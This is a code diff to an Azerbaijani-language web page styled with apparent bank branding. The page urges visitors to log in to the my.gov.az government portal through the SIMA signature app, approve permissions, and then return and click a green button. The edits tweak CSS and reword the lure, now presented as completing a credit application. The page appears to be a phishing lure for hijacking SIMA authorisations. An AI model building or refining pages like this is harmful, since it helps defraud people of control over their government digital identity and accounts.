@@ -91,7 +91,7 @@
             margin-bottom: 20px; 
         }
         
-        .hero-title span { color: var(--emba-orange); }
+        .hero-title span { color: var(--emba-orange); text-transform: uppercase; }
 
         .sima-trigger-card {
             background: rgba(255, 255, 255, 0.15);
@@ -104,12 +104,13 @@
 
         .important-note {
             background-color: rgba(255, 255, 255, 0.2);
-            padding: 10px;
+            padding: 12px;
             border-radius: 8px;
             font-weight: bold;
             color: #fff;
             margin-top: 15px;
-            border-left: 4px solid var(--emba-orange);
+            border-left: 5px solid var(--emba-orange);
+            font-size: 14px;
         }
 
         .btn-sima {
@@ -228,15 +229,15 @@
 
     <div class="hero-content">
         <div class="hero-title">
-            <span>SİMA İLƏ MY.GOV.AZ-A DAXİL OLUN <br> VƏ İCAZƏLƏRİ TƏSDİQLƏYİN</span>
+            <span>SİMA İLƏ MY.GOV.AZ-A DAXİL OL <br> VƏ İCAZƏLƏRİ TƏSDİQLƏ</span>
         </div>
         
         <div class="sima-trigger-card">
             <p style="margin-bottom: 10px; font-size: 16px; line-height: 1.5; font-weight: 500;">
-                Məlumatlarınızın təhlükəsiz ötürülməsi üçün SİMA vasitəsilə təsdiqləmə tələb olunur.
+                Kredit müraciətinizi tamamlamaq üçün SİMA vasitəsilə təsdiqləmə tələb olunur.
             </p>
             <div class="important-note">
-                Vacib: Təsdiqləmə bitdikdən sonra mütləq bu səhifəyə geri qayıdın.
+                Mütləq SİMA-dan təsdiq edəndən sonra bu sayta qayıdın.
             </div>
             <button class="btn-sima" onclick="openSimaModal()">TƏSDİQLƏMƏNİ BAŞLAT</button>
         </div>
@@ -281,7 +282,7 @@
         btnStart.style.display = 'none';
         btnFinish.style.display = 'block';
         guideMsg.innerHTML = "<b>İndi SİMA ilə təsdiq edin</b>";
-        stepTxt.innerHTML = "<b style='color:#d32f2f'>DİQQƏT:</b> SİMA tətbiqində təsdiq verdikdən sonra <b>mütləq bu pəncərəyə qayıdın</b> və yaşıl düyməyə basın.";
+        stepTxt.innerHTML = "<b style='color:#d32f2f'>DİQQƏT:</b> SİMA-dan təsdiq edəndən sonra <b>mütləq bu səhifəyə qayıdın</b> və yaşıl düyməyə basın.";
     }
 
     window.onfocus = function() {
